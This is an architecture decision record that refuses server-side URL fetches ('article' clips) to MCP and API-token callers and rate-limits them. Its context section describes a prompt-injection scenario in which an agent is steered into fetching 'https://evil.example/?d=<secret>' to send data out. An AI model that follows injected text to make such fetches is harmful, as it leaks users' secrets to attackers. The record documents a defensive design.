# 2262. Server-side fetches for clips are for browser sessions only, limited per person and per server

- Status: Accepted
- Date: 2026-11-10

## Context
`mode: 'article'` makes the server GET a URL the caller chose. For an agent steered by injected text,
"fetch https://evil.example/?d=<secret>" is a way to send data out, and the fetch itself costs the
server bandwidth and CPU (ADR 2261).

## Decision
- No MCP tool for clipping.
- `article` with a bearer token (MCP connection or personal API token, `req.authVia !== 'cookie'`) is
  refused: 403 `CLIP_ARTICLE_SESSION_ONLY`, checked before membership or any fetch. `link` stays open
  to write tokens (a script or phone shortcut saving a link is useful and fetches nothing); read-only
  tokens are refused by the general write rule, suggest-only connections by `requireMembership`
  (ADR 2040). The lookup is a read and open to tokens. `SESSION_ONLY` (`tokenPolicy.ts`) matches
  route patterns only, so the mode check lives in the handler.
- Limits on `article` fetches (`clip/limits.ts`, in memory): 10 per person per sliding minute, 2 at
  once per person, 8 at once per server; over a limit → 429 `CLIP_RATE_LIMITED` before fetching or
  creating anything. The route also has a request limit of 30 a minute per browser session (hashed
  session cookie key, token/IP otherwise).
- Every check of ADR 2260 runs before the fetch, so a refused clip contacts nothing.

## Alternatives considered
- Refuse the whole route to tokens: simpler, but loses "save a link from a script" for no gain.
- Allow `article` to tokens with a host allowlist: an allowlist the person must maintain, and any
  allowed host with an open redirect or user content is still a channel.
- Only the global per-IP limit: one person behind a NAT could spend everyone's budget, and the
  fetch costs more than an ordinary request.

## Trade-offs
- The limiter is per process; several server replicas multiply it (the app runs one).
- `GET /api/link-preview` already lets a personal API token make the server fetch a URL's head;
  that is outside this decision and noted for a later review.

## Consequences
- `clip.db.test.ts` covers the token policy, suggest-only and the limiter; `clip/limits.test.ts`
  the concurrency rules.
